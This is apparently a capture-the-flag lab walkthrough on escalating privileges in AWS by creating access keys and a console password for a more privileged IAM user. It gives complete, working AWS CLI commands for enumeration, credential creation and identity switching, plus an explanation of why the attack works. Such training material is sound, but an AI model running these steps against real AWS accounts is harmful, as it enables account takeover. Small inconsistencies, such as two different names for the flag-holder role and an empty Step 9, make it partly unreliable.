# Walkthrough: CreateAccessKey & CreateLoginProfile Privilege Escalation

## Lab Objective

Learn how to identify and exploit the `iam:CreateAccessKey` and `iam:CreateLoginProfile` permissions to escalate privileges by creating credentials for more privileged users.

## Scenario

You have been provided with access to an entry role with limited permissions. Your goal is to discover a privileged user, create credentials for that user, and retrieve the flag using those credentials.

This lab demonstrates two related techniques:
1. **CreateAccessKey** - Creating programmatic access keys for another user
2. **CreateLoginProfile** - Creating console passwords for another user

## Prerequisites

- AWS CLI installed and configured
- Role ARN from the lab deployment
- Basic understanding of AWS IAM users and credentials
- (Optional) jq for JSON parsing

## Setup

### Step 1: Assume the Lab Entry Role

Assume the lab entry role using the role ARN provided by the lab deployment:

```bash
# Replace with your specific role ARN from the deployment output
ROLE_ARN="arn:aws:iam::ACCOUNT_ID:role/specter-lab-createcredentials-entry"

# Assume the role and get temporary credentials
CREDS=$(aws sts assume-role --role-arn "$ROLE_ARN" --role-session-name lab-session --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' --output text)

# Export the temporary credentials
export AWS_ACCESS_KEY_ID=$(echo $CREDS | awk '{print $1}')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | awk '{print $2}')
export AWS_SESSION_TOKEN=$(echo $CREDS | awk '{print $3}')
export AWS_DEFAULT_REGION="us-east-1"
```

Verify your identity:

```bash
aws sts get-caller-identity | jq
```

Expected output:
```json
{
  "UserId": "AROA...:lab-session",
  "Account": "123456789012",
  "Arn": "arn:aws:sts::123456789012:assumed-role/specter-lab-createcredentials-entry/lab-session"
}
```

Note that your ARN shows `assumed-role` indicating you're using temporary credentials from the entry role.

## Reconnaissance

### Step 2: Enumerate Current Permissions

Check your inline policies:

```bash
# Extract the role name from your assumed role session
ROLE_NAME=$(aws sts get-caller-identity --query 'Arn' --output text | cut -d'/' -f2)
echo "Current role: $ROLE_NAME"

# List inline policies
aws iam list-role-policies --role-name $ROLE_NAME | jq

# Get the policy document
aws iam get-role-policy --role-name $ROLE_NAME --policy-name specter-lab-createcredentials-entry-policy | jq
```

You should see you have:
- Read permissions on your own role
- `iam:ListUsers`, `iam:GetUser` to discover users
- `iam:CreateAccessKey` on another user (**escalation vector**)
- `iam:CreateLoginProfile` on another user (**escalation vector**)
- `iam:ListAccessKeys` to check existing keys

### Step 3: Discover the Target User

List all IAM users in the account:

```bash
aws iam list-users --query 'Users[*].[UserName,Arn]' --output table | jq
```

Look for the privileged target user:
```
specter-lab-createcredentials-privileged
```

Get details about the target user:

```bash
TARGET_USER="specter-lab-createcredentials-privileged"

aws iam get-user --user-name $TARGET_USER | jq
```

### Step 4: Check Target User's Current Credentials

Check if the user has any access keys:

```bash
aws iam list-access-keys --user-name $TARGET_USER | jq
```

Expected output:
```json
{
  "AccessKeyMetadata": []
}
```

**Key Finding**: The user has NO access keys currently!

Check if the user has a login profile (console password):

```bash
aws iam get-login-profile --user-name $TARGET_USER | jq
```

Expected error:
```
An error occurred (NoSuchEntity) when calling the GetLoginProfile operation
```

**Key Finding**: The user has NO login profile currently!

### Step 5: Check Target User's Permissions

List policies attached to the target user:

```bash
# List inline policies
aws iam list-user-policies --user-name $TARGET_USER | jq

# Get inline policy details
aws iam get-user-policy --user-name $TARGET_USER --policy-name specter-lab-createcredentials-privileged-policy | jq
```

The target user has permissions to read the flag from the IAM role, but we can't use them directly because the user has no active credentials.

## Exploitation

### Technique 1: CreateAccessKey (Programmatic Access)

#### Step 6: Create Access Keys for the Privileged User

Use `iam:CreateAccessKey` to create new access keys for the target user:

```bash
aws iam create-access-key --user-name $TARGET_USER | jq
```

Expected output:
```json
{
  "AccessKey": {
    "UserName": "specter-lab-createcredentials-privileged",
    "AccessKeyId": "AKIA...",
    "Status": "Active",
    "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG...",
    "CreateDate": "2024-01-15T12:34:56Z"
  }
}
```

**Important**: Save the `AccessKeyId` and `SecretAccessKey` - you'll need them!

#### Step 7: Configure AWS CLI with the New Credentials

Save your current credentials and switch to the privileged user's credentials:

```bash
# Use the new access keys
export AWS_ACCESS_KEY_ID="<new-access-key-id>"
export AWS_SECRET_ACCESS_KEY="<new-secret-access-key>"
unset AWS_SESSION_TOKEN  # Make sure no session token is set
```

Verify you're now acting as the privileged user:

```bash
aws sts get-caller-identity | jq
```

Expected output:
```json
{
  "UserId": "AIDA...",
  "Account": "123456789012",
  "Arn": "arn:aws:iam::123456789012:user/specter-lab-createcredentials-privileged"
}
```

## Capture the Flag

### Step 8: Retrieve the Flag

Now with the privileged user's credentials, retrieve the flag:

```bash
aws iam get-role --role-name specter-lab-createcredentials-flag-holder --query 'Role.Tags[?Key==`flag`].Value' | jq
```

Expected output:
```
SPECTER:cr34t3_cr3d3nt14ls_h4ck3d
```

## Optional: Technique 2 - CreateLoginProfile (Console Access)

### Step 9: Reset to Attacker Credentials

Switch back to your original attacker credentials:

### Step 10: Create a Login Profile for Console Access

Create a console password for the privileged user:

```bash
aws iam create-login-profile --user-name $TARGET_USER --password 'MySecurePassword123!' | jq
```

Expected output:
```json
{
  "LoginProfile": {
    "UserName": "specter-lab-createcredentials-privileged",
    "CreateDate": "2024-01-15T12:45:00Z",
    "PasswordResetRequired": false
  }
}
```

### Step 11: Get Account ID and Sign-In URL

Get your AWS account ID:

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
```

Construct the sign-in URL:

```bash
echo "Console Sign-In URL: https://$ACCOUNT_ID.signin.aws.amazon.com/console"
```

Or use the alias URL:
```
https://console.aws.amazon.com/
```

### Step 12: Log into AWS Console

1. Navigate to the AWS Console sign-in page
2. Enter the Account ID: `<your-account-id>`
3. Click "Next"
4. Sign in as IAM user:
   - **Username**: `specter-lab-createcredentials-privileged`
   - **Password**: `MySecurePassword123!`
5. Click "Sign in"

### Step 13: Retrieve Flag via Console

Once logged in:

1. Navigate to **IAM** service
2. Click on **Roles** in the left sidebar
3. Find and click on the role: `specter-lab-flag-holder`
4. Click on the **Tags** tab
5. Find the tag with Key: `flag`
6. Read the flag value!

## Understanding the Attack

### Why This Works

1. **Credential Creation Rights**: You had permission to create credentials for another user
2. **No Approval Required**: Credential creation happens immediately with no approval workflow
3. **Full Access**: The new credentials provide complete access as that user
4. **Stealthy**: The privileged user may not notice additional credentials
5. **IAM Users Can Have 2 Keys**: You can create credentials even if one key already exists

### Attack Flow (CreateAccessKey)

```
Entry Role (limited permissions)
    |
    | iam:CreateAccessKey on privileged-user
    |
New Access Keys Created
    |
    | Configure AWS CLI with new keys
    |
Acting as Privileged User
    |
    | iam:GetRole on flag holder
    |
Flag Retrieved!
```

### Attack Flow (CreateLoginProfile)

```
Entry Role (limited permissions)
    |
    | iam:CreateLoginProfile on privileged-user
    |
Console Password Created
    |
    | Login to AWS Console
    |
Acting as Privileged User (Console)
    |
    | Navigate to IAM -> Roles -> Tags
    |
Flag Retrieved!
```

## Additional Resources

- [AWS IAM CreateAccessKey](https://docs.aws.amazon.com/IAM/latest/APIReference/API_CreateAccessKey.html)
- [AWS IAM CreateLoginProfile](https://docs.aws.amazon.com/IAM/latest/APIReference/API_CreateLoginProfile.html)
- [IAM Best Practices - Credential Management](https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html)
- [AWS SSO vs IAM Users](https://docs.aws.amazon.com/singlesignon/latest/userguide/what-is.html)
- [Managing Access Keys](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_access-keys.html)
- [Managing Console Passwords](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_passwords_admin-change-user.html)
- [Rhino Security Labs: AWS Privilege Escalation Methods](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

